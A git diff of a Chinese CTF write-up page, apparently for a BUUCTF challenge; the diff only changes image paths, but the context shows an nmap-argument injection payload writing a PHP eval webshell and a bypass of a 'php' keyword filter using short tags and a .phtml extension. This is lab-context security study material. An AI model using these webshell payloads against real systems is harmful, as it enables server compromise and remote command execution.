@@ -58,18 +58,18 @@
 <p>试用之前的payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39;</span><br></pre></td></tr></table></figure>
 
-<p>回显<img src="/buutcf18.assets/image-20210730120023112.png" alt="image-20210730120023112"></p>
+<p>回显<img src="/2021/07/29/buutcf18/image-20210730120023112.png" alt="image-20210730120023112"></p>
 <p>说明存在防火墙过滤，fuzz发现过滤了<code>php</code></p>
 <p>这里我们利用短标签绕过<code>=</code>替换第一个php，用phtml替换第二个php</p>
 <p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.phtml &#39;</span><br></pre></td></tr></table></figure>
 
 <p>回显</p>
-<p><img src="/buutcf18.assets/image-20210730120301221.png" alt="image-20210730120301221"></p>
+<p><img src="/2021/07/29/buutcf18/image-20210730120301221.png" alt="image-20210730120301221"></p>
 <p>但是我们这边不知道为什么没办法用蚁剑直接连接</p>
 <p>源码提示flag在根目录下</p>
-<p><img src="/buutcf18.assets/image-20210730120859946.png" alt="image-20210730120859946"></p>
-<p>尝试POST命令<img src="/buutcf18.assets/image-20210730120711045.png" alt="image-20210730120711045"></p>
+<p><img src="/2021/07/29/buutcf18/image-20210730120859946.png" alt="image-20210730120859946"></p>
+<p>尝试POST命令<img src="/2021/07/29/buutcf18/image-20210730120711045.png" alt="image-20210730120711045"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
